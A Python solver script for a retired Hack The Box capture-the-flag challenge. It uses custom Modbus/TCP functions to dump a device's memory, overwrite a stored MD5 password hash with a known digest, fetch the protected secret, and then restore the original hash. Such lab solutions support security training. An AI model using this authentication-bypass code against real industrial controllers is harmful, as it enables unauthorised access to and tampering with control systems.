#!/usr/bin/env python3
"""Dependency-free solver for the retired HTB Sneak peek challenge."""

import hashlib
import re
import socket
import struct
import sys


MEMORY_SIZE = 16 * 1024
READ_CHUNK = 0xFF
OUTER_FUNCTION = 0x64
READ_MEMORY = 0x20
WRITE_MEMORY = 0x21
GET_SECRET = 0x22
SUCCESS = 0xFF


def recv_exact(sock: socket.socket, size: int) -> bytes:
    result = bytearray()
    while len(result) < size:
        chunk = sock.recv(size - len(result))
        if not chunk:
            raise ConnectionError("server closed the connection")
        result.extend(chunk)
    return bytes(result)


class Client:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=10)
        self.transaction_id = 0

    def close(self) -> None:
        self.sock.close()

    def request(self, payload: bytes) -> bytes:
        self.transaction_id = (self.transaction_id + 1) & 0xFFFF
        pdu = bytes([OUTER_FUNCTION]) + payload
        mbap = struct.pack(">HHHB", self.transaction_id, 0, len(pdu) + 1, 1)
        self.sock.sendall(mbap + pdu)

        header = recv_exact(self.sock, 7)
        response_id, protocol, length, _unit = struct.unpack(">HHHB", header)
        if response_id != self.transaction_id or protocol != 0:
            raise RuntimeError("invalid Modbus/TCP response header")
        return recv_exact(self.sock, length - 1)

    def operation(self, operation: int, data: bytes = b"") -> tuple[bool, bytes]:
        response = self.request(bytes([0, operation]) + data)
        prefix = bytes([OUTER_FUNCTION, 0, operation])
        if len(response) < 4 or not response.startswith(prefix):
            raise RuntimeError(f"unexpected response: {response.hex(' ')}")
        return response[3] == SUCCESS, response[4:]

    def read(self, address: int, length: int) -> bytes:
        request_data = address.to_bytes(3, "big") + bytes([length])
        ok, data = self.operation(READ_MEMORY, request_data)
        if not ok or len(data) != length:
            raise RuntimeError(f"read failed at 0x{address:04x}")
        return data

    def write(self, address: int, data: bytes) -> None:
        request_data = address.to_bytes(3, "big") + data
        ok, reply = self.operation(WRITE_MEMORY, request_data)
        if not ok or reply != b"\x01":
            raise RuntimeError(f"write failed at 0x{address:04x}")

    def get_secret(self, password: bytes) -> bytes | None:
        ok, data = self.operation(GET_SECRET, password)
        return data if ok else None


def read_memory(client: Client) -> bytes:
    memory = bytearray()
    for address in range(0, MEMORY_SIZE, READ_CHUNK):
        length = min(READ_CHUNK, MEMORY_SIZE - address)
        memory.extend(client.read(address, length))
    return bytes(memory)


def find_hash_entry(memory: bytes) -> tuple[int, bytes]:
    candidates = [
        match
        for match in re.finditer(rb"[^\x00]{16,}", memory)
        if len(match.group()) == 16 and match.group() != b"\xff" * 16
    ]
    if len(candidates) != 1:
        raise RuntimeError(f"expected one hash candidate, found {len(candidates)}")
    match = candidates[0]
    return match.start(), match.group()


def main() -> None:
    if len(sys.argv) != 3:
        raise SystemExit(f"Usage: {sys.argv[0]} <host> <port>")

    host, port = sys.argv[1], int(sys.argv[2])
    known_password = b"known_password"
    known_digest = hashlib.md5(known_password).digest()
    client = Client(host, port)

    try:
        memory = read_memory(client)
        address, original_digest = find_hash_entry(memory)
        print(f"[*] Candidate MD5 entry: 0x{address:04x}")

        try:
            client.write(address, known_digest)
            secret = client.get_secret(known_password)
            if secret is None:
                raise RuntimeError("authentication bypass failed")
            print(f"[+] Secret: {secret.decode(errors='replace')}")
        finally:
            client.write(address, original_digest)
            if client.read(address, 16) != original_digest:
                raise RuntimeError("memory restoration verification failed")
            print("[+] Original hash restored and verified")
    finally:
        client.close()


if __name__ == "__main__":
    main()
